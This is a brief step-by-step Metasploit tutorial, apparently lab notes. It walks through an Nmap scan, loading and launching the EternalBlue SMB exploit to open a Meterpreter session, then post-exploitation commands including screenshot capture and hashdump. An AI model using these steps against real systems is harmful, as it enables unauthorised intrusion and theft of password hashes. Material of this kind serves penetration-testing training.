Metasploit

nmap -sS -Pn -f <ip>

Step 1. Start Metasploit by typing: msfconsole

Step 2. Wait for the Metasploit framework to load.
Expected Output: You should see the Metasploit banner and a command prompt starting with msf6 >.

Step 3: Scan the Target for Vulnerabilities
    a. Use Nmap to scan the target machine for open ports and services: nmap -sS -A <target_ip>
    b. Identify potential vulnerabilities from the scan results. Example Target IP: 192.168.1.100

Step 4: Search for Exploits in Metasploit
    a. Use the following command to search for a specific exploit: search smb
    b. Identify a suitable exploit from the search results. Example Exploit: exploit/windows/smb/ms17_010_eternalblue

Step 5: Use the Exploit
    a. Load the exploit module by typing: use exploit/windows/smb/ms17_010_eternalblue
    b. Verify that the module is loaded by checking the prompt.

Step 6: Set the Required Options
    a. View the required options for the exploit: show options
    b. Set the target's IP address: set RHOST <target_ip>
    c. Set the local host (your machineâ€™s IP address): set LHOST <your_ip>

Step 7: Launch the Exploit
    1. Run the exploit by typing: exploit
    2. If successful, you will gain a Meterpreter session on the target machine. Expected Output: You should see a prompt like meterpreter >, indicating that you have control of the target machine.  

Step 8: Post-Exploitation Tasks
Use the following commands to gather information from the compromised system:
    1. sysinfo
    2. whoami
ipconfig
    3. Capture a screenshot from the target machine: screenshot
    4. Dump the password hashes: hashdump
    
Step 9: Exit the Meterpreter Session: exit
